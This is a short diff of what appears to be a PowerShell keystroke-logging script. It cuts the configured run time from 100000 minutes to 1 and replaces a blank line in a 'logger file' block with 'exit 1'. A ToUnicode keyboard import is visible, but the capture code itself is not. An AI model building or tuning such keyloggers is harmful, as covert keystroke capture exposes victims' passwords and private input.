@@ -1,6 +1,6 @@
 # Edit only this section!
 $TimesToRun = 2
-$RunTimeP = 100000
+$RunTimeP = 1
 
 $TimeStart = Get-Date
 $TimeEnd = $timeStart.addminutes($RunTimeP)
@@ -72,7 +72,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   finally
   {
     # open logger file in Notepad
-	
+	exit 1
   }
 }
 
